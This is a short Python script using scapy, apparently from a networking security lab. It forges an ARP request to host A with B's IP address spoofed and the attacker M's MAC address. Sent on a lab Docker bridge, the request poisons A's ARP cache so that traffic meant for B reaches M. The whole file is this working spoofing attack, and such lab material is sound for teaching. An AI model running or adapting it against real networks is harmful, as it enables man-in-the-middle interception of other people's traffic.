from scapy.all import *

arp = ARP()
arp.op = 1                       # ARP request
arp.pdst = "10.9.0.6"           # A's IP
arp.hwdst = "02:42:0a:09:00:06" # A's MAC
arp.psrc = "10.9.0.7"           # Spoofed as B's IP
arp.hwsrc = "02:42:8b:e5:7c:2f" # M's MAC

eth = Ether()
eth.dst = "02:42:0a:09:00:06"   # A's MAC
eth.src = "02:42:8b:e5:7c:2f"   # M's MAC

pkt = eth / arp
sendp(pkt, iface="br-abac777a5a78")
